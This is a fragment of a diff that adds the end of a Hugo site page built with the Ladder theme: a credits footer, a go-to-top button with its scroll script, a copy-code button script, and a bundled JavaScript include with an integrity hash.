+    <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>
+    <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a>
+️  </p>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M10.5376 22.7916C11.0152 22.7207 22.5795 21.1781 22.0978 10.4211C22.0536 9.43274 21.9303 8.53367 21.7387 7.71865M10.5376 22.7916C16.876 22.3728 20.0969 19.8899 21.5383 16.9142M10.5376 22.7916C9.7707 22.9055 8.97982 22.8964 8.19743 22.7725M21.7387 7.71865C21.4988 6.69828 21.1518 5.80967 20.7188 5.04257M21.7387 7.71865C22.6022 10.1105 23.0542 13.7848 21.5383 16.9142M20.7188 5.04257C17.1684 -1.24629 7.83127 0.632493 4.27577 5.04257C2.88063 6.77451 -0.0433281 11.1668 1.38159 16.6571C2.27481 20.0988 5.17269 22.2936 8.19743 22.7725M20.7188 5.04257C22.0697 6.9404 24.0299 11.3848 22.3541 15.4153M21.5383 16.9142C21.8737 16.4251 22.1428 15.9235 22.3541 15.4153M8.19743 22.7725C12.1971 23.4683 20.6281 22.971 22.3541 15.4153M14 10.945C13.3836 10.289 12.003 8.63215 11.2034 7.04814C11.1703 6.98257 11.0247 6.98456 10.9937 7.05061C10.5221 8.05496 9.07362 9.92941 8 10.945M11.0333 7.44444C10.9392 9.86549 11 15 12 17" stroke="currentColor" stroke-linecap="round"/>
+    </svg>
+</a>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'Copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'Copied';
+            setTimeout(() => {
+                copybutton.innerHTML = 'Copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+        codeblock.parentNode.appendChild(copybutton);
+    });
+</script></main>
+    </body>
+  
+  <script src="/main.min.6bb26b69159420159c74dc9e097b06a578ed2b68c701466a91a44a9632d851bd0af167a1b30012387b4c512b48ad9ad4d3394e04d77ae38d57e1920fe4ed34fe.js" integrity="sha512-a7JraRWUIBWcdNyeCXsGpXjtK2jHAUZqkaRKljLYUb0K8WehswASOHtMUStIrZrU0zlOBNd6441X4ZIP5O00/g==" crossorigin="anonymous" defer></script></html>
